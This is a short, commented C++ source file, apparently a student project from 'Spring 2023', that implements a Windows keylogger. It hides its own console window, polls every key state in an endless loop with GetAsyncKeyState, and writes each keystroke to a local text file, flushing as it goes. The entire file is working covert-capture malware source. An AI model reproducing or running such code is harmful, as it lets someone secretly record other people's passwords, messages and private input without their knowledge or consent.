/*

Spring 2023

*/

#include <iostream>
#include <fstream>
#include <Windows.h>
#include <chrono>
#include <thread>

using namespace std;

int main() {

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	int word = 0;

	//declare object
	ofstream savedFile;
	
	//opens file with stream object
	//we use append mode to make sure that each key that is being pressed will end up in file
	savedFile.open("newText.txt", ios::app);

	while (true) {

		//loops through key codes, ranging from 8 to 190
		//checks if its been typed
		for (int i = 8; i <= 190; i++) {

			//checks the state of the keys and if its been typed
			if (GetAsyncKeyState(i) == -32767) {

				/*
				space key code = 32, checks if space is typed
				and writes it out to file if it is
				*/
				if (i == 32) {
					savedFile << " ";

					//increment
					word++;
				}
				//backspace key code = 8, checks it
				else if (i == 8) {
					savedFile << "[delete]";
				}
				else {
					// int to char 
					char k = static_cast<char>(i);

					//writes to this objects and applied to phyiscal file assocaited to it
					savedFile << k;
				}

				//create new line every 10 words based on space
				//checks if divisible by 10
				if (word % 10 == 9) {
					savedFile << endl;
				}
				//write in real time
				savedFile.flush();
			}
		}
	}
	
	//closes a file by flushing the associated buffers
	savedFile.close();

	return 0;
}
